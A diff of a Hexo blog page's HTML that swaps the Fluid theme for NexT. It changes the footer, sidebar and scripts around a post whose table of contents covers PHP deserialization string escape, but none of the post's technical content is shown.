-<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/202307281519899.png" srcset="/img/load.gif" lazyload alt="屏幕截图 2023-07-28 151916"></p>
-<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/202307281523588.jpg" srcset="/img/load.gif" lazyload alt="1947190-20200419170915652-243798386"></p>
+<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/202307281519899.png" alt="屏幕截图 2023-07-28 151916"></p>
+<p><img src="https://ysper-1.oss-cn-hangzhou.aliyuncs.com/img/202307281523588.jpg" alt="1947190-20200419170915652-243798386"></p>
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">#字符串逃逸</a>
-      
     </div>
-  
-</div>
 
+    
+    
+    
 
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>php反序列化字符串逃逸</div>
-      <div>http://example.com/2023/07/27/php反序列化字符串逃逸/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>Aŭtoro</div>
-          <div>Ysper</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>Postigita</div>
-          <div>2023年7月27日</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>Aktualizita</div>
-          <div>2023年7月28日</div>
-        </div>
-      
-      
-        <div class="license-meta-item">
-          <div>Lizenta</div>
-          <div>
-            
-              
-              
-                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" rel="tag"># 字符串逃逸</a>
           </div>
-        </div>
-      
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/27/RSA/" rel="prev" title="RSA">
+      <i class="fa fa-chevron-left"></i> RSA
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-    <div class="license-icon iconfont"></div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
   </div>
 
+  <aside class="sidebar">
+    <div class="sidebar-inner">
 
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
 
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2023/07/27/RSA/" title="RSA">
-                        <span class="hidden-mobile">RSA</span>
-                        <span class="visible-mobile">Sekva afiŝo</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-  
-  
-    <article id="comments" lazyload>
-      
-
-    </article>
-  
-
-
-          </article>
-        </div>
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%A4%E7%A7%8D%E6%83%85%E5%86%B5"><span class="nav-number">2.</span> <span class="nav-text">两种情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%A2%9E%E5%A4%9A%E6%83%85%E5%86%B5"><span class="nav-number">3.</span> <span class="nav-text">字符增多情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%87%8F%E5%B0%91%E6%83%85%E5%86%B5"><span class="nav-number">4.</span> <span class="nav-text">字符减少情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%99%85%E4%BE%8B%E9%A2%98%E6%BC%94%E7%A4%BA"><span class="nav-number">5.</span> <span class="nav-text">实际例题演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%AE%E5%90%8D%E9%80%83%E9%80%B8"><span class="nav-number">5.1.</span> <span class="nav-text">键名逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%AE%E5%80%BC%E9%80%83%E9%80%B8"><span class="nav-number">5.2.</span> <span class="nav-text">键值逃逸</span></a></li></ol></li></ol></div>
       </div>
-    </div>
+      <!--/noindex-->
 
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>Enhavtabelo</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Ysper</p>
+  <div class="site-description" itemprop="description">橘子</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
 </div>
 
 
 
+      </div>
+
+    </div>
   </aside>
+  <div id="sidebar-dimmer"></div>
 
 
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Serĉi</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
       </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">ŝlosivorto</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ysper</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
-</div>
 
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
-  
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="busuanzi_container_site_pv" style="display: none">
-        Vidoj: 
-        <span id="busuanzi_value_site_pv"></span>
         
-      </span>
-    
-    
-      <span id="busuanzi_container_site_uv" style="display: none">
-        Visitoj: 
-        <span id="busuanzi_value_site_uv"></span>
-        
-      </span>
-    
-    
-  
-</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
 
   
-  
-  
-</div>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-  </footer>
+<script src="/js/utils.js"></script>
 
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
+<script src="/js/motion.js"></script>
 
 
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+<script src="/js/schemes/pisces.js"></script>
 
 
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
 
 
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+
+
+
+
+
+
+
+
 
 
   
 
-  <noscript>
-    <div class="noscript-warning">Blogo funkcias plej bone kun JavaScript ebligita</div>
-  </noscript>
+  
+
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
